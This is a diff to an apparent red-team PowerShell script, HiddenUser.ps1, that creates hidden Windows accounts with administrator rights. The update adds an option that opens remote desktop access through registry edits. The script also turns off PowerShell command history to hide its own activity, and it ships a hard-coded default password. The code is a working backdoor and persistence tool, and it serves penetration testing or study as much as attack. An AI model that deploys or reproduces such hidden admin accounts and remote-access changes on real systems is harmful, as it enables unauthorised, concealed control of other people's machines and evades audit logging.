@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: administrator privileges
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.5
+   PS cmdlet Dev version: v1.0.6
 
 .DESCRIPTION
    This CmdLet Querys, Creates or Deletes windows hidden accounts.
@@ -16,7 +16,7 @@
    Required Dependencies: Administrator Privileges on shell
    Mandatory to {Create|Delete} or set the account {Visible|Hidden} state
    The new created user account will be added to 'administrators' Group Name
-   And desktop will allow multiple RDP connections { AllowTSConnections }
+   And desktop will allow multiple RDP connections if set -EnableRDP [ True ]
 
 .Parameter Action
    Accepts arguments: Query, Verbose, Create, Delete, Visible, Hidden
@@ -26,6 +26,9 @@
 
 .Parameter Password
    Accepts the User Account Password (default: mys3cr3tp4ss)
+
+.Parameter EnableRDP
+   Accepts arguments: True and False (default: False)
 
 .EXAMPLE
    PS C:\> Get-Help .\HiddenUser.ps1 -full
@@ -47,6 +50,10 @@
 .EXAMPLE
    PS C:\> .\HiddenUser.ps1 -Action Create -UserName "pedro" -Password "mys3cr3tp4ss"
    Creates 'pedro' hidden account with password 'mys3cr3tp4ss' and 'Administrator' privs
+
+.EXAMPLE
+   PS C:\> .\HiddenUser.ps1 -Action Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss" -EnableRDP True
+   Create 'SSAredTeam' Hidden User Account with 'mys3cr3tp4ss' login password and enables rdp connections.
 
 .EXAMPLE
    PS C:\> .\HiddenUser.ps1 -Action Visible -UserName "pedro"
@@ -76,12 +83,14 @@
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
+   [string]$EnableRDP="false",
    [string]$UserName="false",
    [string]$Password="false",
    [string]$Action="Verbose"
 )
 
 
+$RdpEnableState = "False" ## RDP function default setting!
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 If($Action -ieq "Query" -or $Action -ieq "Verbose"){
@@ -93,7 +102,7 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
 
    .NOTES
       Required Dependencies: none
-      This function works under 'UserLand' privs
+      This function works under 'UserLand' privileges
 
    .EXAMPLE
       PS C:\> .\HiddenUser.ps1 -Action Query
@@ -167,8 +176,8 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
 
    .NOTES
       Required Dependencies: Administrator Privileges on shell
-      This function add's created account to Administrators Group
-      And desktop will allow multiple RDP connections { AllowTSConnections } 
+      The new created user account will be added to 'administrators' Group Name
+      And desktop will allow multiple RDP connections if set -EnableRDP [ True ] 
 
    .EXAMPLE
       PS C:\> .\HiddenUser.ps1 -Action Create -UserName "SSAredTeam"
@@ -177,6 +186,10 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
    .EXAMPLE
       PS C:\> .\HiddenUser.ps1 -Action Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss"
       Create 'SSAredTeam' Hidden User Account with 'mys3cr3tp4ss' login password
+
+   .EXAMPLE
+      PS C:\> .\HiddenUser.ps1 -Action Create -UserName "SSAredTeam" -Password "mys3cr3tp4ss" -EnableRDP True
+      Create 'SSAredTeam' Hidden User Account with 'mys3cr3tp4ss' login password and enables RDP connections.
 
    .OUTPUTS
       Enabled Name       LastLogon PasswordLastSet     PasswordRequired
@@ -244,9 +257,13 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
 
    }
 
-   ## Allow account RDP multiple connections
-   reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f|Out-Null
-   reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f|Out-Null
+   If($EnableRDP -ieq "True"){## Allow account RDP multiple connections ???
+
+      $RdpEnableState = "True"
+      reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f|Out-Null
+      reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f|Out-Null
+
+   }
 
    ## De-Activate account { hidden }
    # [cmd] net user $UserName /active:no|Out-Null
@@ -254,17 +271,22 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
    Get-LocalUser $UserName -EA SilentlyContinue |
       Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table
 
+   If($RdpEnableState -ieq "True"){## RDP multiple connections enabled!
+      Write-Host "${Env:COMPUTERNAME}: as RDP multiple connections enabled!`n`n" -ForegroundColor Green -BackgroundColor Black      
+   }
+
 
 }ElseIf($Action -ieq "Delete"){
 
    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Delete User Account {active|inactive}
+      Helper - Delete User Account's {active|inactive}
 
    .NOTES
       Required Dependencies: Administrator Privileges on shell
-      This CmdLet prevents the deletion of 'system' account's {administrator|Guest}
+      This function deletes system rdp connections by deleting
+      the comrrespondent registry keys { if they exist }
 
    .EXAMPLE
       PS C:\> .\HiddenUser.ps1 -Action Delete -UserName "SSAredTeam"
@@ -313,13 +335,23 @@ If($Action -ieq "Query" -or $Action -ieq "Verbose"){
       ## [cmd] net user $UserName /DELETE|Out-Null
       Remove-LocalUser -Name "$UserName"|Out-Null
 
-      ## Delete account RDP user access
-      reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f|Out-Null
-      reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f|Out-Null
+      $RdpPath = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
+      $CheckRdpAccess = (Get-Itemproperty -path "$RdpPath" -EA SilentlyContinue).AllowTSConnections
+      If($CheckRdpAccess -eq 1){## Delete account RDP user access if exists!
+
+         $RdpEnableState = "True"
+         reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f|Out-Null
+         reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f|Out-Null
+
+      }
 
       ## Build Output Table
       Get-LocalUser * -EA SilentlyContinue |
          Select-Object Enabled,Name,LastLogon,PasswordLastSet,PasswordRequired | Format-Table
+
+      If($RdpEnableState -ieq "True"){## RDP multiple connections enabled -> disable it!
+         Write-Host "${Env:COMPUTERNAME}: RDP multiple connections Disabled!`n`n" -ForegroundColor Green -BackgroundColor Black      
+      }
          
    }Else{## [error] Account Name NOT found
    
